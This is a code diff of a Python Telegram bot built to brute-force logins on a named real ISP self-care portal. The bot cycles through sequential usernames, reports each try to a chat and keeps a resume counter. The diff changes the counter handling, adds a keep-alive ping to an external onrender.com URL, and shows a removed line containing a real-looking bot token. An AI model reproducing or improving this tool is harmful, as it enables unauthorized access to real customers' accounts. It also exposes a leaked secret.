@@ -16,7 +16,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 app = Flask(__name__)
 
 # Telegram bot token
-TOKEN = '7127811523:AAGp8Ow2XkoFEqpszsMH8nzYw72lsQXhkfU'
+TOKEN = 'your_bot_token_here'
 
 # Set the URL of the login form
 base_url = "https://selfcare.carnival.com.bd"
@@ -35,15 +35,12 @@ def read_counter():
     if os.path.exists(COUNTER_FILE):
         with open(COUNTER_FILE, "r") as f:
             return int(f.read().strip())
-    return 100570 # Default starting value
+    return 100674 # Default starting value
 
 # Function to write the counter value to a file
 def write_counter(value):
     with open(COUNTER_FILE, "w") as f:
         f.write(str(value))
-
-# Initialize the username counter from the file
-username = read_counter()
 
 # Create the Telegram Application
 application = ApplicationBuilder().token(TOKEN).build()
@@ -51,6 +48,7 @@ application = ApplicationBuilder().token(TOKEN).build()
 # Function to perform the brute force attack
 async def brute_force_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global username
+    username = read_counter()  # Ensure the counter is always reloaded before starting
     while True:
         logging.info(f"Trying username {username}...")
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Trying username {username}...")
@@ -82,6 +80,16 @@ async def brute_force_attack(update: Update, context: ContextTypes.DEFAULT_TYPE)
         username += 1
         write_counter(username)
         await asyncio.sleep(1)  # Add a delay to avoid overwhelming the server
+
+# Function to periodically check the webhook URL every 10 seconds
+async def periodic_check():
+    while True:
+        try:
+            response = requests.get(f'https://letmesee.onrender.com/{TOKEN}')
+            logging.info(f"Webhook check status: {response.status_code}")
+        except Exception as e:
+            logging.error(f"Error while checking webhook: {e}")
+        await asyncio.sleep(10)  # Wait for 10 seconds before the next check
 
 # Telegram bot handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -134,6 +142,7 @@ async def main() -> None:
     # Run application and webserver together
     async with application:
         await application.start()
+        asyncio.create_task(periodic_check())  # Start the periodic check task
         await webserver.serve()
 
 if __name__ == '__main__':
